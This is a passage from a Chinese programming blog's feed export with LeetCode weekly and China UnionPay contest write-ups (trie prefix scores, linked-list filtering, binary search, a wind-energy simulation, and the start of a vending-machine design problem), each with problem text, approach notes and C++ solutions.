class="line">                    &#125;</span><br><span class="line">                    arr.<span class="built_in">emplace_back</span>(curr-&gt;left);</span><br><span class="line">                    arr.<span class="built_in">emplace_back</span>(curr-&gt;right);</span><br><span class="line">                    qu.<span class="built_in">emplace</span>(curr-&gt;left);</span><br><span class="line">                    qu.<span class="built_in">emplace</span>(curr-&gt;right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">reverse</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                arr[i]-&gt;val = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            level++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6183-字符串的前缀分数和"><a href="#6183-字符串的前缀分数和" class="headerlink" title="6183. 字符串的前缀分数和"></a>6183. 字符串的前缀分数和</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个长度为 <code>n</code> 的数组 <code>words</code> ，该数组由 非空 字符串组成。</p>
<p>定义字符串 <code>word</code> 的 分数 等于以 <code>word</code> 作为 前缀 的 <code>words[i] </code>的数目。</p>
<p>例如，如果 <code>words = [&quot;a&quot;, &quot;ab&quot;, &quot;abc&quot;, &quot;cab&quot;]</code> ，那么 <code>&quot;ab&quot;</code> 的分数是 <code>2 </code>，因为 <code>&quot;ab&quot;</code> 是 <code>&quot;ab&quot;</code> 和 <code>&quot;abc&quot;</code> 的一个前缀。<br>返回一个长度为 <code>n</code> 的数组 <code>answer</code> ，其中 <code>answer[i]</code> 是 <code>words[i]</code> 的每个非空前缀的分数 总和 。</p>
<p>注意：字符串视作它自身的一个前缀。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：words = [&quot;abc&quot;,&quot;ab&quot;,&quot;bc&quot;,&quot;b&quot;]</span><br><span class="line">输出：[5,4,3,2]</span><br><span class="line">解释：对应每个字符串的答案如下：</span><br><span class="line">- &quot;abc&quot; 有 3 个前缀：&quot;a&quot;、&quot;ab&quot; 和 &quot;abc&quot; 。</span><br><span class="line">- 2 个字符串的前缀为 &quot;a&quot; ，2 个字符串的前缀为 &quot;ab&quot; ，1 个字符串的前缀为 &quot;abc&quot; 。</span><br><span class="line">总计 answer[0] = 2 + 2 + 1 = 5 。</span><br><span class="line">- &quot;ab&quot; 有 2 个前缀：&quot;a&quot; 和 &quot;ab&quot; 。</span><br><span class="line">- 2 个字符串的前缀为 &quot;a&quot; ，2 个字符串的前缀为 &quot;ab&quot; 。</span><br><span class="line">总计 answer[1] = 2 + 2 = 4 。</span><br><span class="line">- &quot;bc&quot; 有 2 个前缀：&quot;b&quot; 和 &quot;bc&quot; 。</span><br><span class="line">- 2 个字符串的前缀为 &quot;b&quot; ，1 个字符串的前缀为 &quot;bc&quot; 。 </span><br><span class="line">总计 answer[2] = 2 + 1 = 3 。</span><br><span class="line">- &quot;b&quot; 有 1 个前缀：&quot;b&quot;。</span><br><span class="line">- 2 个字符串的前缀为 &quot;b&quot; 。</span><br><span class="line">总计 answer[3] = 2 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：words = [&quot;abcd&quot;]</span><br><span class="line">输出：[4]</span><br><span class="line">解释：</span><br><span class="line">&quot;abcd&quot; 有 4 个前缀 &quot;a&quot;、&quot;ab&quot;、&quot;abc&quot; 和 &quot;abcd&quot;。</span><br><span class="line">每个前缀的分数都是 1 ，总计 answer[0] = 1 + 1 + 1 + 1 = 4 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= words.length &lt;= 1000</code></li>
<li><code>1 &lt;= words[i].length &lt;= 1000</code></li>
<li><code>words[i]</code> 由小写英文字母组成</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/sum-of-prefix-scores-of-strings/">https://leetcode.cn/problems/sum-of-prefix-scores-of-strings/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p>trie树</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉这个是个中等难度的题目，首先利用 <code>trie</code> 树存储所有字符串的前缀的统计次数。对于字符串 $s$ 进行搜索时，我们将在 <code>trie</code> 树中遇到的所有的前缀的统计次数叠加即可，不需要特别复杂的思考的问题。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \times m)$，其中 $n$ 表示的数组的长度，$m$ 表示每个字符串的平均长度。</li>
<li>空间复杂度：$O(n \times m)$，其中 $n$ 表示的数组的长度，$m$ 表示每个字符串的平均长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Trie</span>&#123;</span><br><span class="line">    <span class="type">bool</span> isWord;</span><br><span class="line">    <span class="type">int</span> cnt;</span><br><span class="line">    vector&lt;Trie *&gt; next;</span><br><span class="line">    <span class="built_in">Trie</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;isWord = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;next = <span class="built_in">vector</span>&lt;Trie *&gt;(<span class="number">26</span>, <span class="literal">nullptr</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;cnt = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(Trie * root, string word)</span> </span>&#123;</span><br><span class="line">    Trie *node = root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> c : word) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node-&gt;next[c - <span class="string">&#x27;a&#x27;</span>]) &#123;</span><br><span class="line">            node-&gt;next[c - <span class="string">&#x27;a&#x27;</span>] = <span class="keyword">new</span> <span class="built_in">Trie</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;next[c - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        node-&gt;cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">search</span><span class="params">(Trie *root, string word)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    Trie *node = root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> c : word) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node-&gt;next[c - <span class="string">&#x27;a&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;next[c - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        ans += node-&gt;cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sumPrefixScores</span><span class="params">(vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        Trie *root = <span class="keyword">new</span> <span class="built_in">Trie</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> word : words) &#123;</span><br><span class="line">            <span class="built_in">insert</span>(root, word);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; words.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            ans.<span class="built_in">emplace_back</span>(<span class="built_in">search</span>(root, words[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>中国银联专场竞赛（2023届校园招聘专场）</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/36/</url>
    <content><![CDATA[<h2 id="中国银联专场竞赛（2023届校园招聘专场）"><a href="#中国银联专场竞赛（2023届校园招聘专场）" class="headerlink" title="中国银联专场竞赛（2023届校园招聘专场）"></a>中国银联专场竞赛（2023届校园招聘专场）</h2><p>这个专场赛的题目不咋的，全都是业务逻辑的题目，少了些思考性的题目。</p>
<h4 id="银联-1-重构链表"><a href="#银联-1-重构链表" class="headerlink" title="银联-1. 重构链表"></a>银联-1. 重构链表</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给定一个链表的头节点 <code>head</code> ，在不改变节点顺序的基础下，请删除链表中所有值为 <code>偶数</code> 的节点，并返回这个链表 。</p>
<p><strong>注意：</strong></p>
<ul>
<li>若链表为空，则返回空值。</li>
</ul>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<code>head = [1,4,3,6]</code></p>
<p>输出：<code>[1,3]</code></p>
<p>解释：如下图所示，黑色节点的值均为偶数，删除这些节点后，链表为 <code>[1,3]</code><br><img src="https://pic.leetcode-cn.com/1663123060-ffBMiH-image.png" alt="image.png"></p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<code>head = [5,7,9,9,1]</code></p>
<p>输出：<code>[5,7,9,9,1]</code></p>
<p>解释：原链表中不存在值为偶数的节点。</p>
</blockquote>
<p><strong>示例 3：</strong></p>
<blockquote>
<p>输入：<code>head = [2,4]</code></p>
<p>输出：<code>[]</code></p>
<p>解释：原链表中所有节点值均为偶数。</p>
</blockquote>
<p><strong>提示：</strong><br><code>1 &lt;= head.length &lt;= 10^5</code><br><code>0 &lt;= Node.val &lt;= 100</code></p>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/VLNEbD/">https://leetcode.cn/contest/cnunionpay2022/problems/VLNEbD/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>链表
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接统计偶数元素，然后重建链表即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示链表的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示链表的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reContruct</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line">        <span class="keyword">while</span>(head) &#123;</span><br><span class="line">            <span class="keyword">if</span> (head-&gt;val &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(head-&gt;val);</span><br><span class="line">            &#125;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        head = <span class="literal">NULL</span>;</span><br><span class="line">        ListNode *curr = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!head) &#123;</span><br><span class="line">                head = <span class="keyword">new</span> <span class="built_in">ListNode</span>(arr[i]);</span><br><span class="line">                curr = head;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                curr-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(arr[i]);</span><br><span class="line">                curr = curr-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="银联-2-勘探补给"><a href="#银联-2-勘探补给" class="headerlink" title="银联-2. 勘探补给"></a>银联-2. 勘探补给</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>工程部在一条坐标轴上设立了若干补给站，<code>station[i]</code> 表示编号为 <code>i</code> 的补给站的坐标。</p>
<p>现在有一些正在执行任务的勘探队需要进行补给，<code>pos[i]</code> 表示第 <code>i</code> 个勘探队当前所在位置的坐标。勘探队将优先选择<strong>当前距离最近</strong>的补给站进行补给。若两座补给站距离相同，则选择坐标更小的那一个。</p>
<p><strong>请按顺序</strong>返回这些勘探队所选择的补给站编号。</p>
<p><strong>注意：</strong></p>
<ul>
<li><code>station</code> 中的元素严格递增，即 <code>station[i] &lt; station[i+1]</code></li>
</ul>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<br><code>station = [2,7,8,10]</code><br><code>pos = [4,9]</code><br>输出：<br><code>[0,2]</code><br>解释：<br>坐标 <code>4</code> 的勘探队与坐标为 <code>2</code> 和 <code>7</code> 的补给站距离分别为 <code>2</code> 和 <code>3</code>， 选择坐标为 <code>2</code>的补给站<br>坐标 <code>9</code> 的勘探队与坐标为 <code>8</code> 和 <code>10</code> 的补给站的距离均为 <code>1</code>， 选择坐标更小为 <code>8</code> 的补给站<br>返回编号为 <code>[0,2]</code> 的补给站。</p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<br><code>station = [2,5,8,14,17]</code><br><code>pos = [1,14,11,2]</code><br>输出：<br><code>[0,3,2,0]</code></p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= pos.length,station.length &lt;= 10^4</code></li>
<li><code>1 &lt;= pos[i] &lt;= 10^6</code></li>
<li><code>1 &lt;= station[i] &lt; station[i+1] &lt;= 10^6</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/6olJmJ/">https://leetcode.cn/contest/cnunionpay2022/problems/6olJmJ/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>双指针或者二分查找
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>几乎是模板题目了，感觉直接二分查找即可，找到距离每个 <code>pos</code> 最近的 <code>station</code> 即可，非常简单的二分查找。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(m \log n)$，$m,n$ 表示 <code>pos, station</code> 的长度。</li>
<li>空间复杂度：空间复杂度为 $O(1)$，除返回值外不需要额外的空间。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">explorationSupply</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; station, vector&lt;<span class="type">int</span>&gt;&amp; pos)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = station.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = pos.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(m)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> it = <span class="built_in">lower_bound</span>(station.<span class="built_in">begin</span>(), station.<span class="built_in">end</span>(), pos[i]);</span><br><span class="line">            <span class="keyword">if</span> (it == station.<span class="built_in">begin</span>()) &#123;</span><br><span class="line">                ans[i] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (it == station.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                ans[i] = n - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> x = it - station.<span class="built_in">begin</span>();</span><br><span class="line">                <span class="keyword">if</span> (pos[i] - station[x<span class="number">-1</span>] &lt;= station[x] - pos[i]) &#123;</span><br><span class="line">                    ans[i] = x - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ans[i] = x;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="银联-3-风能发电"><a href="#银联-3-风能发电" class="headerlink" title="银联-3. 风能发电"></a>银联-3. 风能发电</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>现有一座风力发电场和<strong>容量</strong> <code>storeLimit</code> 的储能站，第 <code>j</code> 条供电指令 <code>supply[j]=[time, minSupply, maxSupply]</code> 表示时刻 <code>time</code> 起（包含该时刻）每一时刻最少供应电能 <code>minSupply</code> 以及最多供应电能 <code>maxSupply</code>，直至后续指令调整。</p>
<p>在时刻 <code>i</code> 发电量为 <code>power[i]</code>，该时刻供电逻辑如下：</p>
<ul>
<li><p>若发电量在 <code>[minSupply, maxSupply]</code> 范围内，则均供应负载；</p>
</li>
<li><p>若发电量大于 <code>maxSupply</code>，则超出部分存入储能站，存储量至多不超过 <code>storeLimit</code>；</p>
</li>
<li><p>若发电量小于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">minSupply</span><br></pre></td></tr></table></figure>

<p>，则由储能站补充缺少电量，最多不超过当前存储量；</p>
<blockquote>
<p>注：储能站补充电量，直至剩余存储电量为 <code>0</code></p>
</blockquote>
</li>
</ul>
<p>请返回最后时刻（即时刻 <code>power.length-1</code>）储能站中能源总量。</p>
<p><strong>注意：</strong></p>
<ul>
<li>输入用例保证供电指令的 <code>time</code> 严格递增且第 <code>0</code> 个指令的 <code>time = 0</code></li>
<li>储能电站初始存储电量为 <code>0</code></li>
</ul>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<br><code>storeLimit = 10</code><br><code>power = [1,3,4,3,6]</code><br><code>supply = [[0,2,3]]</code></p>
<p>输出: <code>4</code></p>
<p>解释：<br>时刻 0，供能 1， 新增储能 0， 总储能 0<br>时刻 1，供能 3， 新增储能 0， 总储能 0<br>时刻 2，供能 3， 新增储能 1， 总储能 1<br>时刻 3，供能 3， 新增储能 0， 总储能 1<br>时刻 4，供能 3， 新增储能 3， 总储能 4<br>因此最后时刻，剩余的能源总量为 4</p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<br><code>storeLimit = 6</code><br><code>power = [6,5,2,1,0]</code><br><code>supply = [[0,1,2],[2,3,3]]</code></p>
<p>输出: <code>0</code></p>
<p>解释：<br>时刻 0，供能 2， 新增储能 4， 总储能 4<br>时刻 1，供能 2， 新增储能 2， 总储能 6 (由于储能电站达上限，电量 1 丢弃)<br>时刻 2，供能 3， 新增储能 -1， 总储能 5<br>时刻 3，供能 3， 新增储能 -2， 总储能 3<br>时刻 4，供能 3， 新增储能 -3， 总储能 0<br>因此最后时刻，剩余的能源总量为 0</p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= storeLimit &lt;= 10^6</code></li>
<li><code>1 &lt;= power.length &lt;= 10^5</code></li>
<li><code>0 &lt;= power[i] &lt;= 10^5</code></li>
<li><code>1 &lt;= supply.length &lt;= power.length</code></li>
<li>对于 <code>i &lt; j</code>，满足 <code>supply[i][0] &lt; supply[j][0]</code></li>
<li><code>supply[i].length == 3</code></li>
<li><code>0 &lt;= supply[i][0] &lt; power.length</code></li>
<li><code>0 &lt;= supply[i][1]&lt;= supply[i][2] &lt;= 10^5</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/wMGN0t/">https://leetcode.cn/contest/cnunionpay2022/problems/wMGN0t/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于 <code>supply</code> 从 <code>0</code> 开始，因此我们直接模拟从最小的开始即可：<ul>
<li>如果 <code>power</code> 小于 <code>supply</code> 则减少储能即可；</li>
<li>如果 <code>power</code> 大于 <code>supply</code> 则增加储能即可；</li>
<li>最终返回最后的储能结果即可；</li>
</ul>
</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n + m)$，$m, n$ 为  <code>power, supply</code> 的长度。</li>
<li>空间复杂度：空间复杂度为 $O(m)$，$m$ 为数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">StoredEnergy</span><span class="params">(<span class="type">int</span> storeLimit, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; power, <span class="type">const</span> vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; supply)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = power.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> total = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; arr = supply;</span><br><span class="line">        arr.<span class="built_in">emplace_back</span>(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(&#123;n, <span class="number">0</span>, <span class="number">0</span>&#125;));</span><br><span class="line">        <span class="type">int</span> m = arr.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>, i = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; arr[j][<span class="number">0</span>] &amp;&amp; i &lt; n) &#123;</span><br><span class="line">                <span class="keyword">if</span> (power[i] &lt; arr[j<span class="number">-1</span>][<span class="number">1</span>]) &#123;</span><br><span class="line">                    total = <span class="built_in">max</span>(total - (arr[j<span class="number">-1</span>][<span class="number">1</span>] - power[i]), <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (power[i] &gt; arr[j<span class="number">-1</span>][<span class="number">2</span>]) &#123;</span><br><span class="line">                    total = <span class="built_in">min</span>(total + (power[i] - arr[j<span class="number">-1</span>][<span class="number">2</span>]), storeLimit);</span><br><span class="line">                &#125;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="银联-4-设计自动售货机"><a href="#银联-4-设计自动售货机" class="headerlink" title="银联-4. 设计自动售货机"></a>银联-4. 设计自动售货机</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>「银联二维码」支付可以提供简便、顺畅的消费服务，通过出示二维码或扫描二维码即可完成支付。<br>现有一台使用<strong>银联二维码</strong>进行支付的自动售货机，并对使用 银联 支付的用户提供额外的优惠服务。</p>
<blockquote>
<p>同一名顾客每成功购买一次，下次购买便可多享受 1% 的折扣（折后价<strong>向上取整</strong>），最低折扣为 70%</p>
<ul>
<li>即：第一次购买支付 100% 费用，第二次购买支付 99% 费用， 第三次购买支付 98% 费用，以此类推。</li>
</ul>
</blockquote>
<p>请你设计一个自动售货机，你需要实现一个 <code>VendingMachine</code> 类：</p>
<ul>
<li><p><code>VendingMachine()</code> —— 初始化一个 <code>VendingMachine</code> 实例</p>
</li>
<li><p>&#96;&#96;&#96;<br>void addItem(int time, int number, string item, int price, int duration)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">—— 在</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>time</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">时刻向售货机中增加</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>number</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">个名称为</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>item</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">的商品，价格为</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>price</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">，保质期为</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>duration</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 同种商品可能有不同批次，不同批次的价格和保质期可能不同</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  long sell(int time, string customer, string item, int number)</span><br></pre></td></tr></table></figure>

<p>—— 在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">time</span><br></pre></td></tr></table></figure>

<p>时刻，名称为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">customer</span><br></pre></td></tr></table></figure>

<p>的顾客前来购买了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">number</span><br></pre></td></tr></table></figure>

<p>个名称为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">item</span><br></pre></td></tr></table></figure>

<p>的商品，返回总费用</p>
<ul>
<li>当且仅当售货机中存在足够数量的未过期商品方可成功购买，并返回支付的总费用，否则一件商品也不会售出，并返回 <code>-1</code></li>
<li>对于价格不同的同种商品，优先售出价格<strong>最低</strong>的商品；</li>
<li>如果有价格相同的同种商品，优先出售<strong>距离过期时间最近</strong>的商品；</li>
</ul>
</li>
</ul>
<p><strong>注意：</strong></p>
<ul>
<li>输入保证前一次操作的 <code>time</code> 不大于后一次操作的 <code>time</code></li>
<li>过期指商品存入的时刻与保质期之和小于当前时刻，也即 <code>addtime + duration &lt; currTime</code></li>
</ul>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<br><code>[&quot;VendingMachine&quot;,&quot;addItem&quot;,&quot;sell&quot;,&quot;sell&quot;,&quot;sell&quot;,&quot;sell&quot;]</code><br><code>[[],[0,3,&quot;Apple&quot;,10,10],[1,&quot;Tom&quot;,&quot;Apple&quot;,1],[2,&quot;Tom&quot;,&quot;Apple&quot;,3],[3,&quot;Mary&quot;,&quot;Banana&quot;,2],[11,&quot;Jim&quot;,&quot;Apple&quot;,1]]</code></p>
<p>输出: <code>[null,null,10,-1,-1,-1]</code></p>
